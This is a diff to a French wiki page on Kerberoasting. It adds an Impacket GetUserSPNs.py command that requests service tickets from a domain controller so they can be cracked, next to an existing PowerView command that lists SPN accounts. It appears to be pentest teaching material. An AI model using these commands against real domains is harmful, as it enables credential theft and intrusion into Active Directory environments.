@@ -26,6 +26,8 @@ Get-NetUser -Domain blabla.local -DomainController XX.XX.XX.XX -Verbose -SPN
 ```
 
 Il est possible de récupérer les parties à cracker avec [Impacket](/Impacket "wikilink") et l'outil **GetUsersSPN.py**
+```GetUserSPNs.py -dc-ip 192.168.1.1 -request domain.local/validaccount
+```
 
 Ressources
 ----------
